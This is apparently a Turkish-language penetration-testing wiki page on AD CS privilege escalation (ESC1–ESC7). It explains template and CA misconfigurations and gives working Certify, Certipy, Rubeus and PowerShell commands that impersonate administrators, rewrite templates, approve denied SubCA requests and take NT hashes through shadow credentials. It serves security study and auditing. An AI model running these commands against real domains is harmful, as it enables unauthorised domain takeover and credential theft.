# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**Bu, aşağıdaki yazılardaki escalation tekniği bölümlerinin özetidir:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Yanlış Yapılandırılmış Sertifika Şablonları - ESC1

### Açıklama

### Yanlış Yapılandırılmış Sertifika Şablonları - ESC1 Açıklaması

- **Enterprise CA, düşük ayrıcalıklı kullanıcılara enrollment hakları verir.**
- **Yönetici onayı gerekmez.**
- **Yetkili personelin imzası gerekmez.**
- **Sertifika şablonlarındaki güvenlik tanımlayıcıları aşırı izin vericidir ve düşük ayrıcalıklı kullanıcıların enrollment hakları almasına olanak tanır.**
- **Sertifika şablonları, kimlik doğrulamayı kolaylaştıran EKU'ları tanımlayacak şekilde yapılandırılmıştır:**
  - Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) gibi Extended Key Usage (EKU) tanımlayıcıları veya EKU olmaması (SubCA) buna dahildir.
- **Şablon, istekte bulunanların Certificate Signing Request (CSR) içine subjectAltName eklemesine izin verir:**
  - Active Directory (AD), mevcut olduğunda kimlik doğrulaması için sertifikadaki subjectAltName'i (SAN) önceliklendirir. Bu, CSR'de SAN belirterek herhangi bir kullanıcıyı (ör. bir domain administrator) taklit eden bir sertifika istenebileceği anlamına gelir. İsteği yapanın SAN belirtebilmesi, sertifika şablonunun AD nesnesindeki `mspki-certificate-name-flag` özelliğiyle belirtilir. Bu özellik bir bitmask'tir ve `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` bayrağının bulunması, isteği yapanın SAN belirtmesine izin verir.

> [!CAUTION]
> Bu ayarlar, tamamlanmış bir taklit yolu değil, ESC1 adayı bir şablonu belirler. Hedef principal'ın şablonu yayımlayan bir CA'da enrollment yapabildiğini, CA enrollment işleminin izinli olduğunu ve verilen sertifikanın kimlik doğrulama uç noktasının güçlü SID eşleme kurallarını karşıladığını kontrol edin. Güncel yamalı KDC'ler, sertifikanın SID'si hedefle eşleşmediğinde istenen UPN'yi reddedebilir; bkz. [Microsoft'un sertifika eşleme kılavuzu](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

**Domain Computers** grubuna verilen enrollment hakları, özgün kullanıcı enrollment yapamasa bile aşamalı bir bilgisayar kimliğinin uygun olmasını sağlayabilir. Bilgisayar principal'ının haklarını ayrıca değerlendirin. İstek göndermeden önce `msPKI-Minimal-Key-Size` değerini kontrol edin: 4096-bit RSA anahtarı gerektiren bir şablon, istemcinin varsayılan 2048-bit anahtarını reddeder. İstekte belirtilen hedef SID, SID uyuşmazlığını yalnızca CA ve KDC ortaya çıkan sertifikayı ve eşlemeyi kabul ederse giderebilir; ne şablon bayrakları ne de tek başına bir Enroll ACE bunu kanıtlar.

Bu özellik bazen ürünler veya dağıtım hizmetleri tarafından HTTPS ya da host sertifikalarının anında oluşturulmasını desteklemek için veya bilgi eksikliği nedeniyle etkinleştirilir.

Bu seçenekle sertifika oluşturmanın bir uyarıyı tetiklediği belirtilmiştir. Ancak mevcut bir sertifika şablonu (örneğin `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` etkin olan `WebServer` şablonu) kopyalanıp kimlik doğrulama OID'si içerecek şekilde değiştirilirse bu uyarı tetiklenmez.<sup>[[6]](#references)</sup>

### Kötüye Kullanım

**Güvenlik açığı bulunan sertifika şablonlarını bulmak** için şunu çalıştırabilirsiniz:

```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```

**Bir yöneticiyi taklit etmek için bu güvenlik açığından yararlanarak** şu komut çalıştırılabilir:

```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
  /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
  -template 'ESC1' -upn 'administrator@corp.local'
```

Ardından oluşturulan **sertifikayı `.pfx` biçimine** dönüştürebilir ve **Rubeus veya certipy kullanarak yeniden kimlik doğrulaması yapabilirsiniz**:<sup>[[5]](#references)</sup>

```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

Windows ikili dosyaları "Certreq.exe" ve "Certutil.exe", PFX oluşturmak için kullanılabilir: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Forest'ün yapılandırma şemasındaki sertifika şablonları; özellikle onay veya imza gerektirmeyen, Client Authentication veya Smart Card Logon EKU'suna sahip ve `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` bayrağı etkin olan şablonlar, aşağıdaki LDAP sorgusu çalıştırılarak listelenebilir:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

## Hatalı Yapılandırılmış Sertifika Şablonları - ESC2

### Açıklama

İkinci kötüye kullanım senaryosu, ilk senaryonun bir çeşididir:

1. Enterprise CA, düşük ayrıcalıklı kullanıcılara kayıt hakları verir.
2. Yönetici onayı gereksinimi devre dışı bırakılmıştır.
3. Yetkili imza gereksinimi kaldırılmıştır.
4. Sertifika şablonundaki aşırı izin verici bir güvenlik tanımlayıcısı, düşük ayrıcalıklı kullanıcılara sertifika kaydı hakları verir.
5. **Sertifika şablonu, Any Purpose EKU'yu veya hiçbir EKU'yu içerecek şekilde tanımlanmıştır.**

**Any Purpose EKU**, saldırganın istemci kimlik doğrulaması, sunucu kimlik doğrulaması, kod imzalama vb. **herhangi bir amaçla** sertifika edinmesine olanak tanır. Bu senaryoyu istismar etmek için **ESC3 için kullanılan tekniğin aynısı** kullanılabilir.

Alt CA sertifikaları gibi davranan **EKU'su olmayan** sertifikalar **herhangi bir amaçla** istismar edilebilir ve **yeni sertifikaları imzalamak için de kullanılabilir**. Dolayısıyla saldırgan, bir alt CA sertifikası kullanarak yeni sertifikalarda rastgele EKU'lar veya alanlar belirtebilir.

Ancak, alt CA **`NTAuthCertificates`** nesnesi tarafından güvenilir değilse (varsayılan ayar budur), **etki alanı kimlik doğrulaması** için oluşturulan yeni sertifikalar çalışmaz. Buna rağmen saldırgan, herhangi bir EKU'ya ve rastgele sertifika değerlerine sahip **yeni sertifikalar** oluşturabilir. Bunlar çok çeşitli amaçlarla (ör. kod imzalama, sunucu kimlik doğrulaması vb.) potansiyel olarak **kötüye kullanılabilir** ve ağdaki SAML, AD FS veya IPSec gibi diğer uygulamalar açısından önemli sonuçlara yol açabilir.<sup>[[6]](#references)</sup>

AD Forest yapılandırma şemasında bu senaryoyla eşleşen şablonları numaralandırmak için aşağıdaki LDAP sorgusu çalıştırılabilir:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

## Yanlış Yapılandırılmış Enrollment Agent Şablonları - ESC3

### Açıklama

Bu senaryo ilk ve ikinci senaryolara benzer, ancak **farklı bir EKU’yu** (Certificate Request Agent) ve **2 farklı şablonu** (dolayısıyla 2 ayrı gereksinim kümesini) **kötüye kullanır**.

Microsoft belgelerinde **Enrollment Agent** olarak bilinen **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), bir sorumlunun başka bir kullanıcı **adına** **sertifika** için **kayıt** olmasına olanak tanır.

**“Enrollment agent”** böyle bir **şablona** kaydolur ve elde ettiği **sertifikayı, diğer kullanıcı adına bir CSR’yi birlikte imzalamak için kullanır**. Ardından **birlikte imzalanmış CSR’yi**, **“başkası adına kayıt”** izni veren bir **şablona** kaydolmak üzere CA’ya **gönderir**. CA ise **“diğer” kullanıcıya ait bir sertifikayla** yanıt verir.<sup>[[6]](#references)</sup>

**Gereksinimler 1:**

- Enterprise CA, düşük ayrıcalıklı kullanıcılara kayıt hakları verir.
- Yönetici onayı gereksinimi devre dışı bırakılmıştır.
- Yetkili imza gereksinimi yoktur.
- Sertifika şablonunun güvenlik tanımlayıcısı aşırı izin vericidir ve düşük ayrıcalıklı kullanıcılara kayıt hakkı verir.
- Sertifika şablonu, diğer sorumlular adına başka sertifika şablonları için istek yapılmasını sağlayan Certificate Request Agent EKU’sunu içerir.

**Gereksinimler 2:**

- Enterprise CA, düşük ayrıcalıklı kullanıcılara kayıt hakları verir.
- Yönetici onayı atlanmıştır.
- Sürüm 1 hedef şablonu, daha yeni ayrıntılı issuance-policy denetimleri olmadan bir enrollment agent’ı kabul edebilir; sürüm 2 veya daha yeni şablonlarda ise şablonu yalnızca sürümüne göre elemek yerine uygulama ilkesi için issuance gereksinimlerini ve yetkili imzaları değerlendirin.
- Sertifika şablonunda tanımlı bir EKU, etki alanı kimlik doğrulamasına izin verir.
- CA’da enrollment agent kısıtlamaları uygulanmaz.

Hedef şablon ayrıca seçilen CA tarafından yayımlanmalı, hedef hesabın kayıt olmasına izin vermeli ve amaçlanan etki alanı kimlik doğrulaması kullanımını desteklemelidir. Bu hesapta gerekli subject/SAN özniteliklerini kontrol edin; örneğin AD’den subject e-postası oluşturan bir şablon, gerekli `mail` değeri olmayan bir hesap için sertifika veremez. Tek başına bir agent sertifikası bu hedef şablon gereksinimlerini karşılamaz.

### Kötüye Kullanım

Bu senaryoyu kötüye kullanmak için [**Certify**](https://github.com/GhostPack/Certify) veya [**Certipy**](https://github.com/ly4k/Certipy) kullanabilirsiniz:<sup>[[4]](#references)</sup>

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

**Enrollment agent certificate** almaya **yetkili** **kullanıcılar**, enrollment **agent**’ların enrollment yapmasına izin verilen şablonlar ve enrollment agent’ın adına hareket edebileceği **hesaplar**, kurumsal CA’ler tarafından kısıtlanabilir. Bunun için `certsrc.msc` **snap-in**’ini açın, **CA’ye sağ tıklayın**, **Properties**’e tıklayın ve “Enrollment Agents” sekmesine **gidin**.

Ancak CA’ler için **varsayılan** ayarın “**Do not restrict enrollment agents**” olduğu belirtilmelidir. Yöneticiler enrollment agent’lara yönelik kısıtlamayı etkinleştirip “Restrict enrollment agents” olarak ayarladığında bile varsayılan yapılandırma son derece izin verici kalır. **Everyone**’ın tüm şablonlara herhangi biri olarak enrollment yapmasına izin verir.

### Certi-Bhai ile yalnızca Windows’ta çalışan PowerShell PoC’leri

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai), Certify veya Certipy kullanmadan ESC1 ve ESC2/ESC3’ü uygular. Betikleri, `X509Enrollment` COM API’siyle dışa aktarılabilir 2048 bit RSA anahtarı oluşturur, PKCS#10 isteği hazırlar, LDAP üzerinden ilk `pKIEnrollmentService` nesnesini bulur, isteği `CertificateAuthority.Request` aracılığıyla gönderir, yanıtı `Cert:\CurrentUser\My` konumuna yükler ve Base64 kodlu bir PFX dışa aktarır. ESC1 betiği saldırganın seçtiği bir UPN SAN’ı (`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, değer `0xb`) eklerken ESC2/ESC3 betikleri ilk sertifikayı, başkası adına gönderilen bir PKCS#7 isteğini imzalamak için kullanır.<sup>[[27]](#references)</sup>

```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
  -altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
  -target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```

Betikler, Rubeus ile doğrudan kullanmak için özel anahtarı da içeren **PFX**'in Base64 biçimini yazdırır. `[Convert]::ToBase64String($cert.RawData)` ile değiştirmeyin: `RawData` yalnızca genel sertifikayı kodlar ve PKINIT isteğini imzalayamaz.<sup>[[5]](#references)[[27]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```

## Zafiyetli Sertifika Şablonu Erişim Denetimi - ESC4

### **Açıklama**

**Sertifika şablonlarının** üzerindeki **güvenlik tanımlayıcısı**, **AD sorumlularının** şablonla ilgili sahip olduğu **izinleri** tanımlar.

Bir **saldırgan**, bir **şablonu** **değiştirmek** ve **önceki bölümlerde** açıklanan **istismar edilebilir yanlış yapılandırmaları** uygulamak için gerekli **izinlere** sahipse, ayrıcalık yükseltme mümkün olabilir.

Sertifika şablonları için geçerli olan önemli izinler şunlardır:<sup>[[6]](#references)</sup>

- **Owner:** Nesne üzerinde örtük denetim sağlar ve tüm özniteliklerin değiştirilmesine olanak tanır.
- **FullControl:** Tüm öznitelikleri değiştirme yetkisi de dahil olmak üzere nesne üzerinde tam yetki sağlar.
- **WriteOwner:** Nesnenin sahibinin, saldırganın denetimindeki bir sorumlu olarak değiştirilmesine izin verir.
- **WriteDacl:** Erişim denetimlerinin değiştirilmesine olanak tanır ve saldırgana FullControl verilmesini sağlayabilir.
- **WriteProperty:** Herhangi bir nesne özelliğinin düzenlenmesine izin verir.

`CN=Certificate Templates,CN=Public Key Services,CN=Services,...` kapsayıcısındaki DACL'yi de inceleyin. [`pKICertificateTemplate` sınıfı](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adsc/db4b45f7-e57a-4ae1-9b8f-1b107b69d98c) için kapsamı belirlenmiş geçerli bir `CreateChild` ACE'si veya geniş kapsamlı tam denetim, yeni bir şablon nesnesi oluşturmak için kullanılabilir. [Microsoft'un belgelerinde](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/9279abb2-3dfa-4631-845c-43c187ac4b44) bu kapsayıcının şablon nesnelerini barındırdığı belirtilir. Oluşturma işleminin etkili olup olmadığına karar vermeden önce eşleşen deny ACE'lerini ve devralma ayarlarını inceleyin. Bir şablon oluşturmak tek başına sertifika verilmesini sağlamaz: Bir CA'nın şablonu yayımlaması, talepte bulunan sorumlunun enrollment erişimine sahip olması ve sertifikanın kimlik doğrulama uç noktasında amaçlanan kimlikle eşleşmesi gerekir.

### Kötüye Kullanım

Şablonlar ve diğer PKI nesneleri üzerinde düzenleme haklarına sahip sorumluları belirlemek için Certify ile numaralandırma yapın:

```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```

Önceki örneğe benzer bir privesc örneği:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4, bir kullanıcının sertifika şablonu üzerinde yazma ayrıcalıklarına sahip olduğu durumdur. Örneğin bu durum, sertifika şablonunun yapılandırmasını üzerine yazarak şablonu ESC1'e karşı savunmasız hâle getirmek için kötüye kullanılabilir.

Enrollee'nin subject'i sağlamasına izin veren ancak yalnızca Server Authentication kullanımına sahip bir şablon, tek başına kullanıcı oturum açma şablonu değildir. Etkili şablon denetimi haklarına sahip bir saldırgan, sertifika istemeden önce şablonun authentication EKU'larını veya application policy'lerini değiştirebilir; [Microsoft, Smartcard Logon EKU'sunun oturum açma amacını belgeliyor](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts). CA'nın değiştirilmiş şablonu yayımladığını, istekte bulunanın sertifika kaydı yapabildiğini, onay/imza gereksinimlerinin karşılandığını ve verilen sertifikanın amaçlanan hesapla eşleştiğini doğrulayın. Özellikle, [Full Enforcement modundaki yamalı etki alanı denetleyicileri](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) güçlü eşlemesi olmayan sertifikaları reddeder; isteğe hedef UPN'yi eklemek bu gereksinimi atlatmaz.

Yukarıdaki yolda görebileceğimiz gibi, bu ayrıcalıklara yalnızca `JOHNPC` sahip; ancak kullanıcımız `JOHN`, `JOHNPC`'ye yönelik yeni `AddKeyCredentialLink` edge'ine sahip. Bu teknik sertifikalarla ilgili olduğundan, [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) olarak bilinen bu saldırıyı da uyguladım.<sup>[[8]](#references)</sup> İşte kurbanın NT hash'ini almak için Certipy'nin `shadow auto` komutuna kısa bir bakış.

```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```

**Certipy**, tek bir komutla sertifika şablonunun yapılandırmasının üzerine yazabilir. **Varsayılan olarak**, Certipy, **ESC1'e karşı savunmasız hale getirmek için yapılandırmanın üzerine yazar**. Ayrıca, **eski yapılandırmayı kaydetmek için `-save-old` parametresini belirtebiliriz**; bu, attack'imizden sonra yapılandırmayı **geri yüklemek** için kullanışlı olacaktır.

```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```

## Vulnerable PKI Nesne Erişim Denetimi - ESC5

### Açıklama

Sertifika şablonları ve sertifika yetkilisinin ötesindeki çeşitli nesneleri de içeren, ACL tabanlı ilişkilerden oluşan kapsamlı ağ, tüm AD CS sisteminin güvenliğini etkileyebilir. Güvenliği önemli ölçüde etkileyebilecek bu nesneler şunlardır:

- S4U2Self veya S4U2Proxy gibi mekanizmalar aracılığıyla ele geçirilebilecek CA sunucusunun AD bilgisayar nesnesi.
- CA sunucusunun RPC/DCOM sunucusu.
- `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` özel kapsayıcı yolu içindeki tüm alt AD nesneleri veya kapsayıcıları. Bu yol, Sertifika Şablonları kapsayıcısı, Sertifika Yetkilileri kapsayıcısı, NTAuthCertificates nesnesi ve Enrollment Services kapsayıcısı gibi kapsayıcıları ve nesneleri içerir, ancak bunlarla sınırlı değildir.

Düşük ayrıcalıklı bir saldırgan bu kritik bileşenlerden herhangi biri üzerinde denetim sağlamayı başarırsa PKI sisteminin güvenliği tehlikeye girebilir.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Açıklama

[**CQure Academy gönderisinde**](https://cqureacademy.com/blog/enhanced-key-usage) ele alınan konu, Microsoft'un açıkladığı **`EDITF_ATTRIBUTESUBJECTALTNAME2`** bayrağının etkilerine de değinir. Bir Sertifika Yetkilisi'nde (CA) etkinleştirildiğinde bu yapılandırma, Active Directory®'den oluşturulanlar da dahil olmak üzere **herhangi bir istekte** **konu alternatif adı** için **kullanıcı tanımlı değerlerin** eklenmesine izin verir. Dolayısıyla bu özellik, bir **saldırganın** etki alanı **kimlik doğrulaması** için yapılandırılmış **herhangi bir şablon** üzerinden sertifika almasına olanak tanır; özellikle standart User şablonu gibi **ayrıcalıksız** kullanıcıların sertifika almasına açık olan şablonlardan. Sonuç olarak saldırgan, etki alanı yöneticisi veya etki alanındaki **diğer herhangi bir etkin varlık** olarak kimlik doğrulaması yapmasını sağlayacak bir sertifika edinebilir.<sup>[[9]](#references)</sup>

**Not**: Certificate Signing Request (CSR) içine **alternatif adlar** ekleme yöntemi olan `certreq.exe` içindeki `-attrib "SAN:"` argümanı (“Name Value Pairs” olarak anılır), ESC1'deki SAN'ları istismar etme stratejisinden **farklıdır**. Buradaki fark, **hesap bilgilerinin nasıl kapsüllendiğidir**: bir uzantı yerine sertifika niteliği içinde.

### İstismar

Ayarın etkin olup olmadığını doğrulamak için kuruluşlar `certutil.exe` ile aşağıdaki komutu kullanabilir:

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

Bu işlem esasen **uzak kayıt defteri erişimini** kullanır; dolayısıyla alternatif bir yaklaşım şu olabilir:

```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```

[**Certify**](https://github.com/GhostPack/Certify) ve [**Certipy**](https://github.com/ly4k/Certipy) gibi araçlar bu yanlış yapılandırmayı tespit edip istismar edebilir:<sup>[[4]](#references)</sup>

```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

Bu ayarları değiştirmek için, **etki alanı yöneticisi** haklarına veya eşdeğer yetkilere sahip olunduğu varsayımıyla, aşağıdaki komut herhangi bir iş istasyonundan çalıştırılabilir:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

Ortamınızda bu yapılandırmayı devre dışı bırakmak için flag şu komutla kaldırılabilir:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

> [!WARNING]
> Mayıs 2022 güvenlik güncellemelerinden sonra yeni düzenlenen **sertifikalar**, **istekte bulunanın `objectSid` özelliğini** içeren bir **güvenlik uzantısı** barındırır. ESC1 için bu SID, belirtilen SAN'dan türetilir. Ancak **ESC6** için SID, SAN'ı değil **istekte bulunanın `objectSid` değerini** yansıtır.\
> ESC6'yı istismar etmek için sistemin, **SAN'a yeni güvenlik uzantısından daha fazla öncelik veren** ESC10'a (Weak Certificate Mappings) karşı savunmasız olması şarttır.

## Savunmasız Sertifika Yetkilisi Erişim Denetimi - ESC7

### Saldırı 1

#### Açıklama

Sertifika yetkilisinin erişim denetimi, CA eylemlerini yöneten bir izin kümesiyle sağlanır. Bu izinleri `certsrv.msc`'ye erişerek, bir CA'ya sağ tıklayarak, özellikleri seçerek ve ardından Güvenlik sekmesine giderek görüntüleyebilirsiniz. Ayrıca, izinler PSPKI modülü kullanılarak aşağıdaki gibi komutlarla numaralandırılabilir:

```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```

Bu, sırasıyla “CA administrator” ve “Certificate Manager” rollerine karşılık gelen **`ManageCA`** ve **`ManageCertificates`** temel hakları hakkında bilgi verir.<sup>[[6]](#references)</sup>

#### Abuse

Bir certificate authority üzerinde **`ManageCA`** haklarına sahip olmak, principal’ın PSPKI kullanarak ayarları uzaktan değiştirmesini sağlar. Buna, herhangi bir template’te SAN belirtimine izin veren **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag’ini etkinleştirmek de dahildir; bu, domain escalation için kritik bir unsurdur.

Bu süreç, doğrudan GUI etkileşimi olmadan değişiklik yapılmasına olanak tanıyan PSPKI’nin **Enable-PolicyModuleFlag** cmdlet’i kullanılarak basitleştirilebilir.

**`ManageCertificates`** haklarına sahip olmak, bekleyen isteklerin onaylanmasını sağlar ve böylece “CA certificate manager approval” güvenlik önlemini etkisiz kılar.

Bir certificate istemek, onaylamak ve indirmek için **Certify** ve **PSPKI** modülleri birlikte kullanılabilir:

```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```

### Saldırı 2

#### Açıklama

> [!WARNING]
> **Önceki saldırıda**, **ESC6 saldırısını** gerçekleştirmek için **EDITF_ATTRIBUTESUBJECTALTNAME2** bayrağını **etkinleştirmek** amacıyla **`Manage CA`** izinleri kullanılmıştı; ancak CA hizmeti (`CertSvc`) yeniden başlatılana kadar bunun hiçbir etkisi olmaz. Bir kullanıcı `Manage CA` erişim hakkına sahip olduğunda, hizmeti **yeniden başlatmasına** da izin verilir. Ancak bu, kullanıcının hizmeti uzaktan yeniden başlatabileceği anlamına **gelmez**. Ayrıca, Mayıs 2022 güvenlik güncellemeleri nedeniyle çoğu yamalı ortamda E**SC6 varsayılan olarak çalışmayabilir**.

Bu nedenle burada başka bir saldırı anlatılmaktadır.

Ön koşullar:

- Yalnızca **`ManageCA` izni**
- **`Manage Certificates`** izni (**`ManageCA`** üzerinden verilebilir)
- **`SubCA`** sertifika şablonu **etkin** olmalıdır (**`ManageCA`** üzerinden etkinleştirilebilir)

Teknik, `Manage CA` _ve_ `Manage Certificates` erişim hakkına sahip kullanıcıların **başarısız sertifika isteklerini onaylayabilmesine** dayanır. **`SubCA`** sertifika şablonu **ESC1'e karşı savunmasızdır**, ancak şablona yalnızca **yöneticiler** kayıt olabilir. Dolayısıyla bir **kullanıcı**, **`SubCA`** şablonuna kayıt olmak için **istekte bulunabilir**; bu istek **reddedilir**, ancak **daha sonra yönetici tarafından onaylanır**.<sup>[[6]](#references)</sup>

#### Kötüye Kullanım

Kullanıcınızı yeni bir yetkili olarak ekleyerek **kendinize `Manage Certificates`** erişim hakkı verebilirsiniz.

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```

**`SubCA`** şablonu, `-enable-template` parametresiyle **CA üzerinde etkinleştirilebilir**. `SubCA` şablonu varsayılan olarak etkindir.

```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

Bu saldırı için ön koşulları yerine getirdiysek, **`SubCA` şablonunu temel alan bir sertifika isteyerek** başlayabiliriz.

**Bu istek reddedilecektir**, ancak özel anahtarı kaydedip istek kimliğini not edeceğiz.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

**`Manage CA` ve `Manage Certificates`** yetkilerimizle, `ca` komutunu ve `-issue-request <request ID>` parametresini kullanarak başarısız sertifika isteğini onaylayıp sertifikayı verebiliriz.

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

Ve son olarak, `req` komutunu ve `-retrieve <request ID>` parametresini kullanarak **verilen sertifikayı alabiliriz**.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

